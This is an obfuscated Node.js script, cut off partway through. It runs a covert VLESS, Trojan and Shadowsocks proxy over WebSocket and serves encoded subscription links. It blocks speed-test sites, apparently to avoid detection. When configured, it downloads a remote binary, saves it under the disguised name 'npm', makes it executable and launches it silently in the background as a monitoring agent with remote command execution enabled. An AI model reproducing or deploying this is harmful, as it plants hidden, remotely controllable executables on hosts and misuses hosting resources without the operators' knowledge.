#!/usr/bin/env node

const _0x41b37e=_0x2e68;(function(_0x9902b4,_0x5c1926){const _0x4e7c71={_0x4051a9:0x1f5,_0x43c10d:0x1d0,_0x25815f:0x1ad},_0x5bf4f4=_0x2e68,_0x4bf13b=_0x9902b4();while(!![]){try{const _0x354373=parseInt(_0x5bf4f4(0x1d9))/0x1*(parseInt(_0x5bf4f4(0x191))/0x2)+-parseInt(_0x5bf4f4(_0x4e7c71._0x4051a9))/0x3+parseInt(_0x5bf4f4(0x1a6))/0x4*(parseInt(_0x5bf4f4(0x169))/0x5)+-parseInt(_0x5bf4f4(_0x4e7c71._0x43c10d))/0x6+-parseInt(_0x5bf4f4(0x1bf))/0x7*(-parseInt(_0x5bf4f4(0x1ef))/0x8)+-parseInt(_0x5bf4f4(0x1c7))/0x9+-parseInt(_0x5bf4f4(_0x4e7c71._0x25815f))/0xa*(-parseInt(_0x5bf4f4(0x178))/0xb);if(_0x354373===_0x5c1926)break;else _0x4bf13b['push'](_0x4bf13b['shift']());}catch(_0xeaa322){_0x4bf13b['push'](_0x4bf13b['shift']());}}}(_0x788b,0x92e5b));const os=require('os'),http=require(_0x41b37e(0x1a5)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x41b37e(0x1be)),crypto=require(_0x41b37e(0x1ab)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x41b37e(0x195)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x41b37e(0x1c8)][_0x41b37e(0x1d1)]||_0x41b37e(0x199),NEZHA_SERVER=process[_0x41b37e(0x1c8)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x41b37e(0x1c8)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x41b37e(0x1c8)][_0x41b37e(0x184)]||'',DOMAIN=process[_0x41b37e(0x1c8)][_0x41b37e(0x194)]||_0x41b37e(0x190),AUTO_ACCESS=process[_0x41b37e(0x1c8)][_0x41b37e(0x1ce)]||![],WSPATH=process[_0x41b37e(0x1c8)][_0x41b37e(0x1c6)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x41b37e(0x1c8)][_0x41b37e(0x1b5)]||'piye',NAME=process[_0x41b37e(0x1c8)][_0x41b37e(0x1d3)]||'',PORT=process['env']['PORT']||0xbb8;let uuid=UUID[_0x41b37e(0x1c4)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x41b37e(0x18b),CurrentPort=0x1bb,ISP='';function _0x788b(){const _0x25af4b=['4srxyib','2083','&path=%2F','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readUInt8','crypto','from','6660050xJfEPZ','isp','Failed\x20to\x20get\x20IP','testmy.net','stream','country_code','sha224','listen','SUB_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','find','utf-8','cahnge-your-domain.com','https://amd64.ssss.nyc.mn/agent','none:','chmod\x20+x\x20npm','path','133ecMoab','8443','concat','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','close','replace','data','WSPATH','8579421MUUrvR','env','https://arm64.ssss.nyc.mn/v1','base64','https://oooo.serv00.net/add-url','text/html','&fp=chrome&type=ws&host=','AUTO_ACCESS','split','3818112xclGgG','UUID','utf8','NAME','\x20-p\x20','toLowerCase','createWriteStream','error','then','19UrGKog','catch','8.8.4.4','countryCode','post','--tls','aarch64','slice','readUInt16BE','log','reduce','2053','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','speed.io','arch','once','end','finish','writeFileSync','arm','speed.cloudflare.com','Automatic\x20Access\x20Task\x20added\x20successfully','206400OcdGVg','map','writeHead','get','write','Answer','1256832YwPTIz','startsWith','https://api.ip.sb/geoip','createHash','test','2179490JAjLMa','toString','substr','setsid\x20nohup\x20./npm\x20-s\x20','?encryption=none&security=','none','pop','readFile','text/plain','error:\x20','https://amd64.ssss.nyc.mn/v1','forEach','Status','connection','speedcheck.org','11nnEotP','speedtest.cn','&sni=','Mozilla/5.0','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','length','2096','librespeed.org','vless://','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','trim','application/json','NEZHA_KEY','Not\x20Found\x0a','npm','join','every','2087','trojan://','tls','ss://','url','https://dns.google/resolve?name=','true','your-domain.com','107174qsLYFB','unlink','Unknown','DOMAIN','child_process','bandwidth.place','org','arm64','f5b28b47-53f5-4647-9155-92800af4f474','false','message','pipe',';skip-cert-verify%3Dtrue;mux%3D0#','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/agent','speedtest.net','tls;','send','connect','http'];_0x788b=function(){return _0x25af4b;};return _0x788b();}const DNS_SERVERS=[_0x41b37e(0x1db),'1.1.1.1'],BLOCKED_DOMAINS=[_0x41b37e(0x1a1),'fast.com',_0x41b37e(0x179),_0x41b37e(0x1ed),'speedof.me',_0x41b37e(0x1b0),_0x41b37e(0x196),_0x41b37e(0x1e6),_0x41b37e(0x17f),_0x41b37e(0x177)];function isBlockedDomain(_0x581131){const _0x4eba06=_0x41b37e;if(!_0x581131)return![];const _0x10d25f=_0x581131[_0x4eba06(0x1d5)]();return BLOCKED_DOMAINS['some'](_0x230d92=>{return _0x10d25f===_0x230d92||_0x10d25f['endsWith']('.'+_0x230d92);});}async function getisp(){const _0x27cdaa={_0x2b74b3:0x17b,_0x1cb636:0x1dc,_0x479d6b:0x197,_0x2dab65:0x1c4},_0x10f6f2=_0x41b37e;try{const _0x57f184=await axios[_0x10f6f2(0x1f2)](_0x10f6f2(0x166),{'headers':{'User-Agent':_0x10f6f2(_0x27cdaa._0x2b74b3),'timeout':0xbb8}}),_0xc7661f=_0x57f184[_0x10f6f2(0x1c5)];ISP=(_0xc7661f[_0x10f6f2(0x1b2)]+'-'+_0xc7661f[_0x10f6f2(0x1ae)])[_0x10f6f2(0x1c4)](/ /g,'_');}catch(_0x4b3468){try{const _0x3a4258=await axios[_0x10f6f2(0x1f2)]('http://ip-api.com/json',{'headers':{'User-Agent':_0x10f6f2(_0x27cdaa._0x2b74b3),'timeout':0xbb8}}),_0x38d1a1=_0x3a4258[_0x10f6f2(0x1c5)];ISP=(_0x38d1a1[_0x10f6f2(_0x27cdaa._0x1cb636)]+'-'+_0x38d1a1[_0x10f6f2(_0x27cdaa._0x479d6b)])[_0x10f6f2(_0x27cdaa._0x2dab65)](/ /g,'_');}catch(_0x3b3cdd){ISP=_0x10f6f2(0x193);}}}async function getip(){const _0x15ec45={_0x3761b4:0x190,_0x65ceed:0x1f2,_0x362b7e:0x16e,_0x74fe51:0x1d7},_0x46c61a=_0x41b37e;if(!DOMAIN||DOMAIN===_0x46c61a(_0x15ec45._0x3761b4))try{const _0x475ba6=await axios[_0x46c61a(_0x15ec45._0x65ceed)]('https://api-ipv4.ip.sb/ip',{'timeout':0x1388}),_0x2813ab=_0x475ba6['data'][_0x46c61a(0x182)]();CurrentDomain=_0x2813ab,Tls=_0x46c61a(_0x15ec45._0x362b7e),CurrentPort=PORT;}catch(_0x3fad8d){console[_0x46c61a(_0x15ec45._0x74fe51)](_0x46c61a(0x1af),_0x3fad8d['message']),(CurrentDomain=_0x46c61a(0x1ba),Tls='tls',CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x46c61a(0x18b),CurrentPort=0x1bb;}const httpServer=http['createServer'](async(_0x2b95ac,_0x51c86e)=>{const _0xfdf73d={_0x5dde08:0x170,_0x5c40fb:0x18b,_0x1a68e9:0x180,_0x437cbe:0x17a,_0x5a90d3:0x1a8,_0xf05593:0x18a,_0x286530:0x17a,_0x4fa374:0x1a8,_0x788100:0x1ac,_0x35bf80:0x1bc,_0x330374:0x1ca,_0x36efc3:0x18c,_0x1ad980:0x19d,_0x3894f3:0x1ac,_0x4dbc8c:0x1f1,_0x5caaaa:0x1e9,_0x5dd39e:0x1f1,_0x2c4c25:0x185},_0x17870d={_0x29b8c6:0x1e9},_0x1a9dd8=_0x41b37e;if(_0x2b95ac[_0x1a9dd8(0x18d)]==='/'){const _0x5234b2=path[_0x1a9dd8(0x187)](__dirname,'index.html');fs[_0x1a9dd8(_0xfdf73d._0x5dde08)](_0x5234b2,_0x1a9dd8(0x1d2),(_0x5c9d77,_0x2d971c)=>{const _0x4bb542=_0x1a9dd8;if(_0x5c9d77){_0x51c86e[_0x4bb542(0x1f1)](0xc8,{'Content-Type':'text/html'}),_0x51c86e[_0x4bb542(_0x17870d._0x29b8c6)]('Hello\x20world!');return;}_0x51c86e[_0x4bb542(0x1f1)](0xc8,{'Content-Type':_0x4bb542(0x1cc)}),_0x51c86e['end'](_0x2d971c);});return;}else{if(_0x2b95ac['url']==='/'+SUB_PATH){await getisp(),await getip();const _0x14f624=NAME?NAME+'-'+ISP:ISP,_0x2c39e3=Tls===_0x1a9dd8(0x18b)?_0x1a9dd8(0x18b):'none',_0x472b0a=Tls===_0x1a9dd8(_0xfdf73d._0x5c40fb)?_0x1a9dd8(0x1a2):'',_0xe5d9e=_0x1a9dd8(_0xfdf73d._0x1a68e9)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x1a9dd8(0x16d)+_0x2c39e3+_0x1a9dd8(_0xfdf73d._0x437cbe)+CurrentDomain+_0x1a9dd8(0x1cd)+CurrentDomain+_0x1a9dd8(_0xfdf73d._0x5a90d3)+WSPATH+'#'+_0x14f624,_0x409945=_0x1a9dd8(_0xfdf73d._0xf05593)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?security='+_0x2c39e3+_0x1a9dd8(_0xfdf73d._0x286530)+CurrentDomain+_0x1a9dd8(0x1cd)+CurrentDomain+_0x1a9dd8(_0xfdf73d._0x4fa374)+WSPATH+'#'+_0x14f624,_0x5035a1=Buffer[_0x1a9dd8(_0xfdf73d._0x788100)](_0x1a9dd8(_0xfdf73d._0x35bf80)+UUID)['toString'](_0x1a9dd8(_0xfdf73d._0x330374)),_0x5af8dc=_0x1a9dd8(_0xfdf73d._0x36efc3)+_0x5035a1+'@'+CurrentDomain+':'+CurrentPort+_0x1a9dd8(0x181)+CurrentDomain+';path%3D%2F'+WSPATH+';'+_0x472b0a+'sni%3D'+CurrentDomain+_0x1a9dd8(_0xfdf73d._0x1ad980)+_0x14f624,_0x53e660=_0xe5d9e+'\x0a'+_0x409945+'\x0a'+_0x5af8dc,_0xaad9e9=Buffer[_0x1a9dd8(_0xfdf73d._0x3894f3)](_0x53e660)[_0x1a9dd8(0x16a)](_0x1a9dd8(0x1ca));_0x51c86e[_0x1a9dd8(_0xfdf73d._0x4dbc8c)](0xc8,{'Content-Type':'text/plain'}),_0x51c86e[_0x1a9dd8(_0xfdf73d._0x5caaaa)](_0xaad9e9+'\x0a');}else _0x51c86e[_0x1a9dd8(_0xfdf73d._0x5dd39e)](0x194,{'Content-Type':_0x1a9dd8(0x171)}),_0x51c86e[_0x1a9dd8(0x1e9)](_0x1a9dd8(_0xfdf73d._0x2c4c25));}});function resolveHost(_0x5667a1){return new Promise((_0x5eda53,_0x4a23ba)=>{const _0x4e4b18={_0x29d98f:0x1f2},_0x532385=_0x2e68;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x532385(0x168)](_0x5667a1)){_0x5eda53(_0x5667a1);return;}let _0x24edb6=0x0;function _0x1f04cc(){const _0x379e2f={_0x1ccbe2:0x175},_0x305778=_0x532385;if(_0x24edb6>=DNS_SERVERS[_0x305778(0x17d)]){_0x4a23ba(new Error('Failed\x20to\x20resolve\x20'+_0x5667a1+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2be6b4=DNS_SERVERS[_0x24edb6];_0x24edb6++;const _0x391263=_0x305778(0x18e)+encodeURIComponent(_0x5667a1)+'&type=A';axios[_0x305778(_0x4e4b18._0x29d98f)](_0x391263,{'timeout':0x1388,'headers':{'Accept':_0x305778(0x19e)}})[_0x305778(0x1d8)](_0xcf0786=>{const _0x315323=_0x305778,_0x4bb0ac=_0xcf0786[_0x315323(0x1c5)];if(_0x4bb0ac[_0x315323(_0x379e2f._0x1ccbe2)]===0x0&&_0x4bb0ac['Answer']&&_0x4bb0ac[_0x315323(0x1f4)][_0x315323(0x17d)]>0x0){const _0xe01312=_0x4bb0ac[_0x315323(0x1f4)][_0x315323(0x1b8)](_0x3b530f=>_0x3b530f['type']===0x1);if(_0xe01312){_0x5eda53(_0xe01312[_0x315323(0x1c5)]);return;}}_0x1f04cc();})[_0x305778(0x1da)](_0x1c64a5=>{_0x1f04cc();});}_0x1f04cc();});}function handleVlsConnection(_0x55ca13,_0xba2de){const _0x1d0a04={_0x233ff8:0x1aa,_0x5b7cd1:0x1e0,_0x1164f3:0x1e0,_0x4b0c1e:0x1e3,_0x46b80d:0x1a3},_0x447486={_0x386e7b:0x1a4},_0x4cc47f={_0x4346c2:0x1d7,_0x478fcf:0x19c},_0xb2d982=_0x41b37e,[_0x210e37]=_0xba2de,_0x15934b=_0xba2de[_0xb2d982(0x1e0)](0x1,0x11);if(!_0x15934b['every']((_0x3defab,_0x195d28)=>_0x3defab==parseInt(uuid[_0xb2d982(0x16b)](_0x195d28*0x2,0x2),0x10)))return![];let _0x31dda0=_0xba2de[_0xb2d982(0x1e0)](0x11,0x12)[_0xb2d982(_0x1d0a04._0x233ff8)]()+0x13;const _0x434466=_0xba2de[_0xb2d982(0x1e0)](_0x31dda0,_0x31dda0+=0x2)[_0xb2d982(0x1e1)](0x0),_0x33fa4=_0xba2de[_0xb2d982(_0x1d0a04._0x5b7cd1)](_0x31dda0,_0x31dda0+=0x1)[_0xb2d982(0x1aa)](),_0x510cb5=_0x33fa4==0x1?_0xba2de[_0xb2d982(_0x1d0a04._0x1164f3)](_0x31dda0,_0x31dda0+=0x4)['join']('.'):_0x33fa4==0x2?new TextDecoder()['decode'](_0xba2de[_0xb2d982(_0x1d0a04._0x5b7cd1)](_0x31dda0+0x1,_0x31dda0+=0x1+_0xba2de[_0xb2d982(0x1e0)](_0x31dda0,_0x31dda0+0x1)[_0xb2d982(_0x1d0a04._0x233ff8)]())):_0x33fa4==0x3?_0xba2de[_0xb2d982(0x1e0)](_0x31dda0,_0x31dda0+=0x10)[_0xb2d982(_0x1d0a04._0x4b0c1e)]((_0x3f1d63,_0xb857a4,_0x5e7f99,_0x277e43)=>_0x5e7f99%0x2?_0x3f1d63[_0xb2d982(0x1c1)](_0x277e43[_0xb2d982(0x1e0)](_0x5e7f99-0x1,_0x5e7f99+0x1)):_0x3f1d63,[])[_0xb2d982(0x1f0)](_0x3cb36a=>_0x3cb36a['readUInt16BE'](0x0)[_0xb2d982(0x16a)](0x10))[_0xb2d982(0x187)](':'):'';if(isBlockedDomain(_0x510cb5))return _0x55ca13[_0xb2d982(0x1c3)](),![];_0x55ca13[_0xb2d982(_0x1d0a04._0x46b80d)](new Uint8Array([_0x210e37,0x0]));const _0x4096b8=createWebSocketStream(_0x55ca13);return resolveHost(_0x510cb5)[_0xb2d982(0x1d8)](_0x47528d=>{const _0x1cfa4=_0xb2d982;net[_0x1cfa4(_0x447486._0x386e7b)]({'host':_0x47528d,'port':_0x434466},function(){const _0x314dbf=_0x1cfa4;this['write'](_0xba2de['slice'](_0x31dda0)),_0x4096b8['on'](_0x314dbf(_0x4cc47f._0x4346c2),()=>{})[_0x314dbf(_0x4cc47f._0x478fcf)](this)['on'](_0x314dbf(0x1d7),()=>{})['pipe'](_0x4096b8);})['on'](_0x1cfa4(0x1d7),()=>{});})[_0xb2d982(0x1da)](_0x117283=>{net['connect']({'host':_0x510cb5,'port':_0x434466},function(){const _0x16afac=_0x2e68;this['write'](_0xba2de[_0x16afac(0x1e0)](_0x31dda0)),_0x4096b8['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x16afac(0x19c)](_0x4096b8);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x16d067,_0x53e4e9){const _0x30c114={_0x32a1be:0x17d,_0x1d60ef:0x1e0,_0x25b7ac:0x1b3,_0x19b652:0x1e3,_0x53d16f:0x1c3,_0x10331c:0x1da},_0x1ec1c2={_0x2de92d:0x1a4},_0xc19ec5={_0x194b84:0x17d,_0xcfb5b1:0x1e0,_0x2cd90e:0x1d7},_0x478767=_0x41b37e;try{if(_0x53e4e9[_0x478767(_0x30c114._0x32a1be)]<0x3a)return![];const _0x19160c=_0x53e4e9[_0x478767(_0x30c114._0x1d60ef)](0x0,0x38)['toString'](),_0x402a23=[UUID];let _0x1741f2=null;for(const _0x271be5 of _0x402a23){const _0x123690=crypto[_0x478767(0x167)](_0x478767(_0x30c114._0x25b7ac))['update'](_0x271be5)['digest']('hex');if(_0x123690===_0x19160c){_0x1741f2=_0x271be5;break;}}if(!_0x1741f2)return![];let _0x6b2369=0x38;_0x53e4e9[_0x6b2369]===0xd&&_0x53e4e9[_0x6b2369+0x1]===0xa&&(_0x6b2369+=0x2);const _0x3915f3=_0x53e4e9[_0x6b2369];if(_0x3915f3!==0x1)return![];_0x6b2369+=0x1;const _0x1a4418=_0x53e4e9[_0x6b2369];_0x6b2369+=0x1;let _0x2b8872,_0x17553b;if(_0x1a4418===0x1)_0x2b8872=_0x53e4e9[_0x478767(0x1e0)](_0x6b2369,_0x6b2369+0x4)[_0x478767(0x187)]('.'),_0x6b2369+=0x4;else{if(_0x1a4418===0x3){const _0x5290d3=_0x53e4e9[_0x6b2369];_0x6b2369+=0x1,_0x2b8872=_0x53e4e9['slice'](_0x6b2369,_0x6b2369+_0x5290d3)[_0x478767(0x16a)](),_0x6b2369+=_0x5290d3;}else{if(_0x1a4418===0x4)_0x2b8872=_0x53e4e9[_0x478767(_0x30c114._0x1d60ef)](_0x6b2369,_0x6b2369+0x10)[_0x478767(_0x30c114._0x19b652)]((_0x3f7938,_0x47349e,_0x5b5edc,_0x5db419)=>_0x5b5edc%0x2?_0x3f7938[_0x478767(0x1c1)](_0x5db419[_0x478767(0x1e0)](_0x5b5edc-0x1,_0x5b5edc+0x1)):_0x3f7938,[])[_0x478767(0x1f0)](_0x3691f2=>_0x3691f2[_0x478767(0x1e1)](0x0)[_0x478767(0x16a)](0x10))[_0x478767(0x187)](':'),_0x6b2369+=0x10;else return![];}}_0x17553b=_0x53e4e9['readUInt16BE'](_0x6b2369),_0x6b2369+=0x2;_0x6b2369<_0x53e4e9[_0x478767(0x17d)]&&_0x53e4e9[_0x6b2369]===0xd&&_0x53e4e9[_0x6b2369+0x1]===0xa&&(_0x6b2369+=0x2);if(isBlockedDomain(_0x2b8872))return _0x16d067[_0x478767(_0x30c114._0x53d16f)](),![];const _0x23c918=createWebSocketStream(_0x16d067);return resolveHost(_0x2b8872)['then'](_0x49e34d=>{const _0x28b930={_0x35e034:0x17d,_0x5b7505:0x19c,_0x3177ca:0x1d7},_0x10acff=_0x478767;net[_0x10acff(0x1a4)]({'host':_0x49e34d,'port':_0x17553b},function(){const _0x7a0a6b=_0x10acff;_0x6b2369<_0x53e4e9[_0x7a0a6b(_0x28b930._0x35e034)]&&this[_0x7a0a6b(0x1f3)](_0x53e4e9['slice'](_0x6b2369)),_0x23c918['on']('error',()=>{})[_0x7a0a6b(_0x28b930._0x5b7505)](this)['on'](_0x7a0a6b(_0x28b930._0x3177ca),()=>{})['pipe'](_0x23c918);})['on'](_0x10acff(0x1d7),()=>{});})[_0x478767(_0x30c114._0x10331c)](_0x5a88d3=>{const _0x5db233=_0x478767;net[_0x5db233(_0x1ec1c2._0x2de92d)]({'host':_0x2b8872,'port':_0x17553b},function(){const _0x4e452d=_0x5db233;_0x6b2369<_0x53e4e9[_0x4e452d(_0xc19ec5._0x194b84)]&&this['write'](_0x53e4e9[_0x4e452d(_0xc19ec5._0xcfb5b1)](_0x6b2369)),_0x23c918['on'](_0x4e452d(_0xc19ec5._0x2cd90e),()=>{})['pipe'](this)['on'](_0x4e452d(0x1d7),()=>{})[_0x4e452d(0x19c)](_0x23c918);})['on']('error',()=>{});}),!![];}catch(_0x2b395e){return![];}}function _0x2e68(_0x105659,_0xc06420){const _0x788bea=_0x788b();return _0x2e68=function(_0x2e68f6,_0x2e3d23){_0x2e68f6=_0x2e68f6-0x165;let _0x2c14d6=_0x788bea[_0x2e68f6];return _0x2c14d6;},_0x2e68(_0x105659,_0xc06420);}function handleSsConnection(_0x57496d,_0x5b2eac){const _0x5db526={_0x28d4d5:0x1e0,_0x595a60:0x187,_0x36b09c:0x1e1},_0x2d79ad={_0x490f77:0x1d7},_0x401e33={_0x2be6ae:0x1e0,_0x58306b:0x19c,_0x5afbd6:0x19c},_0x762e6c=_0x41b37e;try{let _0x51ef22=0x0;const _0x45944a=_0x5b2eac[_0x51ef22];_0x51ef22+=0x1;let _0x3ccf9f,_0x46c0a7;if(_0x45944a===0x1)_0x3ccf9f=_0x5b2eac[_0x762e6c(0x1e0)](_0x51ef22,_0x51ef22+0x4)[_0x762e6c(0x187)]('.'),_0x51ef22+=0x4;else{if(_0x45944a===0x3){const _0x307172=_0x5b2eac[_0x51ef22];_0x51ef22+=0x1,_0x3ccf9f=_0x5b2eac[_0x762e6c(_0x5db526._0x28d4d5)](_0x51ef22,_0x51ef22+_0x307172)['toString'](),_0x51ef22+=_0x307172;}else{if(_0x45944a===0x4)_0x3ccf9f=_0x5b2eac[_0x762e6c(_0x5db526._0x28d4d5)](_0x51ef22,_0x51ef22+0x10)['reduce']((_0x2f0898,_0x2da45d,_0x2ab1ee,_0x3e4d82)=>_0x2ab1ee%0x2?_0x2f0898[_0x762e6c(0x1c1)](_0x3e4d82['slice'](_0x2ab1ee-0x1,_0x2ab1ee+0x1)):_0x2f0898,[])[_0x762e6c(0x1f0)](_0x3e43da=>_0x3e43da[_0x762e6c(0x1e1)](0x0)[_0x762e6c(0x16a)](0x10))[_0x762e6c(_0x5db526._0x595a60)](':'),_0x51ef22+=0x10;else return![];}}_0x46c0a7=_0x5b2eac[_0x762e6c(_0x5db526._0x36b09c)](_0x51ef22),_0x51ef22+=0x2;if(isBlockedDomain(_0x3ccf9f))return _0x57496d['close'](),![];const _0x13d0e1=createWebSocketStream(_0x57496d);return resolveHost(_0x3ccf9f)['then'](_0x3f9edf=>{const _0x38b780=_0x762e6c;net[_0x38b780(0x1a4)]({'host':_0x3f9edf,'port':_0x46c0a7},function(){const _0xf1cee7=_0x38b780;_0x51ef22<_0x5b2eac[_0xf1cee7(0x17d)]&&this[_0xf1cee7(0x1f3)](_0x5b2eac[_0xf1cee7(_0x401e33._0x2be6ae)](_0x51ef22)),_0x13d0e1['on']('error',()=>{})[_0xf1cee7(_0x401e33._0x58306b)](this)['on'](_0xf1cee7(0x1d7),()=>{})[_0xf1cee7(_0x401e33._0x5afbd6)](_0x13d0e1);})['on']('error',()=>{});})['catch'](_0x5692f0=>{const _0x1803ea={_0x2f9574:0x17d,_0x38b77c:0x1d7},_0x4647e1=_0x762e6c;net['connect']({'host':_0x3ccf9f,'port':_0x46c0a7},function(){const _0x4025c9=_0x2e68;_0x51ef22<_0x5b2eac[_0x4025c9(_0x1803ea._0x2f9574)]&&this['write'](_0x5b2eac[_0x4025c9(0x1e0)](_0x51ef22)),_0x13d0e1['on'](_0x4025c9(_0x1803ea._0x38b77c),()=>{})[_0x4025c9(0x19c)](this)['on']('error',()=>{})['pipe'](_0x13d0e1);})['on'](_0x4647e1(_0x2d79ad._0x490f77),()=>{});}),!![];}catch(_0x417b34){return![];}}const wss=new WebSocket['Server']({'server':httpServer});wss['on'](_0x41b37e(0x176),(_0x349d91,_0x548cac)=>{const _0x1a21c1={_0xe3cc0b:0x18d,_0xadda6c:0x1c3,_0x25ea0b:0x1e8},_0x168614={_0x3fd21c:0x17d,_0x5e338c:0x1e0,_0x1b379c:0x188,_0x4b312f:0x1c3},_0x114c3c=_0x41b37e,_0x5d5751=_0x548cac[_0x114c3c(_0x1a21c1._0xe3cc0b)]||'',_0x5d29c8='/'+WSPATH;if(!_0x5d5751[_0x114c3c(0x165)](_0x5d29c8)){_0x349d91[_0x114c3c(_0x1a21c1._0xadda6c)]();return;}_0x349d91[_0x114c3c(_0x1a21c1._0x25ea0b)](_0x114c3c(0x19b),_0x57e00b=>{const _0x31c115=_0x114c3c;if(_0x57e00b[_0x31c115(_0x168614._0x3fd21c)]>0x11&&_0x57e00b[0x0]===0x0){const _0x19a88c=_0x57e00b[_0x31c115(_0x168614._0x5e338c)](0x1,0x11),_0x400d09=_0x19a88c[_0x31c115(_0x168614._0x1b379c)]((_0x4ea309,_0x281768)=>_0x4ea309==parseInt(uuid[_0x31c115(0x16b)](_0x281768*0x2,0x2),0x10));if(_0x400d09){!handleVlsConnection(_0x349d91,_0x57e00b)&&_0x349d91[_0x31c115(_0x168614._0x4b312f)]();return;}}if(_0x57e00b[_0x31c115(_0x168614._0x3fd21c)]>=0x3a){if(handleTrojConnection(_0x349d91,_0x57e00b))return;}if(_0x57e00b[_0x31c115(_0x168614._0x3fd21c)]>0x0&&(_0x57e00b[0x0]===0x1||_0x57e00b[0x0]===0x3||_0x57e00b[0x0]===0x4)){if(handleSsConnection(_0x349d91,_0x57e00b))return;}_0x349d91[_0x31c115(_0x168614._0x4b312f)]();})['on'](_0x114c3c(0x1d7),()=>{});});const getDownloadUrl=()=>{const _0x225016={_0x480733:0x173,_0x211254:0x1bb},_0x51b662=_0x41b37e,_0x333fc9=os[_0x51b662(0x1e7)]();return _0x333fc9===_0x51b662(0x1ec)||_0x333fc9===_0x51b662(0x198)||_0x333fc9===_0x51b662(0x1df)?!NEZHA_PORT?_0x51b662(0x1c9):_0x51b662(0x1a0):!NEZHA_PORT?_0x51b662(_0x225016._0x480733):_0x51b662(_0x225016._0x211254);},downloadFile=async()=>{const _0x4ff204={_0x42d05d:0x1f2,_0x1a8610:0x1b1,_0x36adbb:0x186},_0x3a9d3d={_0x5f2197:0x1ea},_0x3bd572={_0x116404:0x1e2,_0x5b4e7a:0x1bd},_0x435ef6=_0x41b37e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4f092a=getDownloadUrl(),_0x36deb6=await axios({'method':_0x435ef6(_0x4ff204._0x42d05d),'url':_0x4f092a,'responseType':_0x435ef6(_0x4ff204._0x1a8610)}),_0x497235=fs[_0x435ef6(0x1d6)](_0x435ef6(_0x4ff204._0x36adbb));return _0x36deb6[_0x435ef6(0x1c5)][_0x435ef6(0x19c)](_0x497235),new Promise((_0x4424be,_0x488419)=>{const _0x22c6f2=_0x435ef6;_0x497235['on'](_0x22c6f2(_0x3a9d3d._0x5f2197),()=>{const _0x3af6fa=_0x22c6f2;console[_0x3af6fa(_0x3bd572._0x116404)]('npm\x20download\x20successfully'),exec(_0x3af6fa(_0x3bd572._0x5b4e7a),_0x3a1e51=>{if(_0x3a1e51)_0x488419(_0x3a1e51);_0x4424be();});}),_0x497235['on']('error',_0x488419);});}catch(_0x2de1de){throw _0x2de1de;}},runnz=async()=>{const _0x57dfd4={_0x31fc91:0x1b9,_0x39e677:0x1e2,_0x147e38:0x1b7,_0x521fa2:0x17e,_0x3909e9:0x189,_0x1d4caa:0x16c,_0x59002f:0x1e5,_0x56c0e4:0x1cf,_0x1ca0dc:0x19a,_0x5ad074:0x19f,_0x328182:0x1eb,_0x29c0dd:0x1c2,_0x16e2cd:0x1d7,_0x1f5290:0x172},_0x4d969a={_0x45a11d:0x1e2},_0x4536d2=_0x41b37e;try{const _0x2756b5=execSync(_0x4536d2(0x17c),{'encoding':_0x4536d2(_0x57dfd4._0x31fc91)});if(_0x2756b5[_0x4536d2(0x182)]()!==''){console[_0x4536d2(_0x57dfd4._0x39e677)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x22766b){}await downloadFile();let _0x3dbe10='',_0x481868=[_0x4536d2(_0x57dfd4._0x147e38),_0x4536d2(0x1c0),_0x4536d2(_0x57dfd4._0x521fa2),_0x4536d2(_0x57dfd4._0x3909e9),_0x4536d2(0x1a7),_0x4536d2(0x1e4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x482401=_0x481868['includes'](NEZHA_PORT)?_0x4536d2(0x1de):'';_0x3dbe10=_0x4536d2(_0x57dfd4._0x1d4caa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4536d2(0x1d4)+NEZHA_KEY+'\x20'+_0x482401+_0x4536d2(_0x57dfd4._0x59002f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26264e=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4536d2(_0x57dfd4._0x56c0e4)](':')[_0x4536d2(0x16f)]():'',_0x110cf0=_0x481868['includes'](_0x26264e)?_0x4536d2(0x18f):_0x4536d2(_0x57dfd4._0x1ca0dc),_0x219efe='client_secret:\x20'+NEZHA_KEY+_0x4536d2(_0x57dfd4._0x5ad074)+NEZHA_SERVER+_0x4536d2(0x1a9)+_0x110cf0+_0x4536d2(0x1b6)+UUID;fs[_0x4536d2(_0x57dfd4._0x328182)]('config.yaml',_0x219efe);}_0x3dbe10=_0x4536d2(_0x57dfd4._0x29c0dd);}else return;}try{exec(_0x3dbe10,{'shell':'/bin/bash'},_0x173a2e=>{const _0x2947e6=_0x4536d2;if(_0x173a2e)console['error']('npm\x20running\x20error:',_0x173a2e);else 